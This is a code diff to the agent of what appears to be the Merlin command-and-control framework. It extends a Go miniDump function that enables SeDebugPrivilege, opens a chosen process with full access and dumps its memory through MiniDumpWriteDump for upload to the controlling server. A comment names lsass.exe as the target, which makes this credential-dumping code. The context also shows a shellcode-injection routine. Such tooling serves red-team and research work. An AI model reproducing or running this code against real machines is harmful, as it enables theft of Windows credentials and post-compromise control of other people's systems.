@@ -20,12 +20,15 @@
 package agent
 
 import (
+	"github.com/Ne0nd0g/merlin/pkg/modules"
 	// Standard
 	"errors"
 	"fmt"
 	"io/ioutil"
 	"os"
 	"os/exec"
+	"path/filepath"
+	"strings"
 	"syscall"
 	"unsafe"
 
@@ -376,9 +379,9 @@ func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
 // TODO always close handle during exception handling
 
 // miniDump will attempt to perform a minidumpwritedump operation on the provided process, and returns the raw bytes of the dumpfile back as an upload to the server. Touches disk during the dump process, however uses the OS default tempfile location
-func miniDump(process string, pid uint32) ([]byte, error) {
-	ret := []byte{}
-
+func miniDump(tempfile, process string, inPid uint32) (modules.MinidumpFile, error) {
+	ret := modules.MinidumpFile{} // []byte{}
+	pid := inPid
 	//get debug privs (required for dumping processes not owned by current user)
 	err := sePrivEnable("SeDebugPrivilege")
 	if err != nil {
@@ -396,25 +399,75 @@ func miniDump(process string, pid uint32) ([]byte, error) {
 		);
 	*/
 	//load up our minidump function
-	k32 := windows.NewLazySystemDLL("Dbgcore.dll")
+	k32 := windows.NewLazySystemDLL("DbgHelp.dll")
 	m := k32.NewProc("MiniDumpWriteDump")
 
-	//set up the tempfile to write to, automatically remove it once done
-	// TODO: Work out how to do this in memory
-	f, e := ioutil.TempFile(os.TempDir(), "")
-	if e != nil {
-		return ret, e
+	var f *os.File
+	var e error
+	if tempfile == "" {
+		//set up the tempfile to write to, automatically remove it once done
+		// TODO: Work out how to do this in memory
+		f, e = ioutil.TempFile(os.TempDir(), "")
+		if e != nil {
+			return ret, e
+		}
+	} else {
+		var dirpath string
+		var filename string
+		//if the supplied path ends with a "\" or a "/", assume user provided a directory
+		if strings.HasSuffix(tempfile, "/") || strings.HasSuffix(tempfile, "\\") {
+			dirpath = tempfile
+		} else {
+			dirpath = filepath.Dir(tempfile)
+			fmt.Println(dirpath)
+			filename = filepath.Base(tempfile)
+		}
+		//check the path to the specified place exists
+		if _, serr := os.Stat(dirpath); serr != nil {
+			return ret, fmt.Errorf("Directory doesn't exist")
+		}
+
+		//if the file is provided, first check if it exists:
+		if filename != "" {
+			if _, serr := os.Stat(tempfile); serr == nil {
+				return ret, fmt.Errorf("File exists")
+			}
+			//otherwise, create new file
+			f, e = os.OpenFile(tempfile, os.O_CREATE|os.O_APPEND|os.O_RDWR, 0600)
+			if e != nil {
+				return ret, e
+			}
+		} else {
+			//user provided a directory, create a tempfile in the specified location
+			f, e = ioutil.TempFile(tempfile, "")
+			if e != nil {
+				return ret, e
+			}
+		}
 	}
+	//remove the file after the function exits, regardless of error nor not
 	defer os.Remove(f.Name())
+
 	stdOutHandle := f.Fd()
 
 	//get our proc ID, and get a handle to the process. If PID is not provided, search for the PID
 	if pid <= 0 {
-		pid = getProcID(process)
+		pid, err = getProcID(process)
+		if err != nil {
+			return ret, err
+		}
 	}
 	if pid <= 0 {
 		return ret, errors.New("could not find the process")
 	}
+	if process == "" || inPid != 0 { //assign process name if the name is blank, or if the pid is provided
+		process, err = getProcName(pid)
+		if err != nil {
+			return ret, err
+		}
+	}
+	ret.ProcID = pid
+	ret.ProcName = process
 	hProc, err := syscall.OpenProcess(0x1F0FFF, false, pid) //PROCESS_ALL_ACCESS := uint32(0x1F0FFF)
 	if err != nil {
 		return ret, err
@@ -426,7 +479,7 @@ func miniDump(process string, pid uint32) ([]byte, error) {
 	f.Close() //idk why this fixes the 'not same as on disk' issue, but it does
 
 	if r != 0 {
-		ret, err = ioutil.ReadFile(f.Name())
+		ret.FileContent, err = ioutil.ReadFile(f.Name())
 		if err != nil {
 			return ret, err
 		}
@@ -435,13 +488,13 @@ func miniDump(process string, pid uint32) ([]byte, error) {
 }
 
 //getProcID returns the PID of the provided process name (eg lsass.exe). PID of < 1 indicates didn't find the process.
-func getProcID(procname string) uint32 {
+func getProcID(procname string) (uint32, error) {
 	//https://github.com/mitchellh/go-ps/blob/master/process_windows.go
 	handle, err := syscall.CreateToolhelp32Snapshot(
 		0x00000002,
 		0)
-	if handle < 0 {
-		return 0
+	if handle < 0 || err != nil {
+		return 0, fmt.Errorf("Could not get snapshot:\n%s", err)
 	}
 	defer syscall.CloseHandle(handle)
 
@@ -449,8 +502,7 @@ func getProcID(procname string) uint32 {
 	entry.Size = uint32(unsafe.Sizeof(entry))
 	err = syscall.Process32First(handle, &entry)
 	if err != nil {
-		fmt.Println(err)
-		return 0
+		return 0, fmt.Errorf("Could not process the handle:\n%s", err)
 	}
 
 	for {
@@ -461,14 +513,50 @@ func getProcID(procname string) uint32 {
 			}
 		}
 		if s == procname {
-			return entry.ProcessID
+			return entry.ProcessID, nil
 		}
 		err = syscall.Process32Next(handle, &entry)
 		if err != nil {
 			break
 		}
 	}
-	return 0
+	return 0, fmt.Errorf("Could not find pid for supplied name \"%s\"", procname)
+}
+
+//getProcName will return the name of the process associated with the specified pid.
+func getProcName(pid uint32) (string, error) {
+	//https://github.com/mitchellh/go-ps/blob/master/process_windows.go
+	handle, err := syscall.CreateToolhelp32Snapshot(
+		0x00000002,
+		0)
+	if handle < 0 || err != nil {
+		return "", fmt.Errorf("Could not get snapshot:\n%s", err)
+	}
+	defer syscall.CloseHandle(handle)
+
+	var entry syscall.ProcessEntry32
+	entry.Size = uint32(unsafe.Sizeof(entry))
+	err = syscall.Process32First(handle, &entry)
+	if err != nil {
+		return "", fmt.Errorf("Could not process the handle:\n%s", err)
+	}
+
+	for {
+		s := ""
+		for _, chr := range entry.ExeFile {
+			if chr != 0 {
+				s = s + string(int(chr))
+			}
+		}
+		if entry.ProcessID == pid {
+			return s, nil
+		}
+		err = syscall.Process32Next(handle, &entry)
+		if err != nil {
+			break
+		}
+	}
+	return "", fmt.Errorf("Could not find pid for supplied pid \"%d\"", pid)
 }
 
 //sePrivEnable adjusts the privileges of the current process to add the passed in string. Good for setting 'SeDebugPrivilege'
